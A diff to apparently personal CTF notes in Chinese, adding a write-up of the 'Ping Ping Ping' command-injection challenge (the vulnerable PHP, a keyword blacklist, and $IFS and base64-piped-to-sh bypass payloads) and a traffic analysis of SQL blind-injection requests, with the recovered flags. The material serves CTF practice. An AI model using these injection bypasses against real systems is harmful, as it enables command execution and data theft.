@@ -382,12 +382,73 @@ if __name__ == "__main__":
 ```
 
 
-## RCE-训练
-?ip=%7c ls%0a127.0.0.1
+## RCE-训练 未整理到笔记
+原题目 GXYCTF2019]Ping Ping Ping
+https://www.gem-love.com/ctf/516.html
 https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
-
+https://www.cnblogs.com/wrnan/p/12811449.html
+https://www.cnblogs.com/yesec/p/12475478.html
 https://www.google.com/search?q=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&oq=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&aqs=chrome..69i57&sourceid=chrome&ie=UTF-8
-https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__file__);
+$ip = $_GET['ip'];
+if (isset($ip)) {
+  if(preg_match("/(;|`| |&|cp|mv|cat|tail|more|rev|tac|\*|\{)/i", $ip)){
+      die("hack");
+  }else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+      die("no!>");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  var_dump($a);
+}
+?>
+```
+想办法绕吧
+```
+?ip=|ls
+有效, $IFS和$IFS$9来绕过空格过滤
+?ip=|ls$IFS/
+找到了flag, 
+    payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+    分号不行，转用base64绕过吧。
+?ip=|echo$IFS$9Y2F0IC9mbGFn|base64$IFS$9-d|sh
+```
+
+
+`xmctf{php_is_verty_ezzzzzzz}`
+
+
+发现{ } < > %09都被ban了，但是可以使用$IFS和$IFS$9来绕过空格过滤
+TODO global
+%3b==; 在后台GET获取时会直接转成;, 不能这样绕过
+
+[命令执行的绕过技巧](https://www.dazhuanlan.com/2019/10/05/5d97c963e2513/)
+
+## 流量分析 
+
+sql盲注。从这里开始
+
+```
+152493  2017-11-15 17:17:27.247019  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=33%23 HTTP/1.1 
+...
+
+153173  2017-11-15 17:17:27.526797  192.168.173.1   192.168.173.134 HTTP    330 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=101%23 HTTP/1.1 
+153183  2017-11-15 17:17:27.530679  192.168.173.1   192.168.173.134 HTTP    330 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),1,1)))=120%23 HTTP/1.1 
+这里120成功了才会进行一下一项注入，ascii码为120。
+153193  2017-11-15 17:17:27.536240  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=33%23 HTTP/1.1 
+153203  2017-11-15 17:17:27.540769  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=34%23 HTTP/1.1 
+153213  2017-11-15 17:17:27.545229  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=35%23 HTTP/1.1 
+153223  2017-11-15 17:17:27.559831  192.168.173.1   192.168.173.134 HTTP    329 GET /index.php?id=1%27and%20(select%20ascii(substr((select%20skyflag_is_here2333%20from%20flag%20limit%200,1),2,1)))=36%23 HTTP/1.1 
+```
+按上面的步骤找到全部的ascii码。组合
+
+`xmctf{w1r3s7@r&b@dv@Nc3d_U#3}`
+
+[某行业攻防培训-----流量分析之-----sql盲注](https://blog.csdn.net/qq_45555226/article/details/102809032)
+
 ## xweb5
 method=logout
 /phpinfo.php
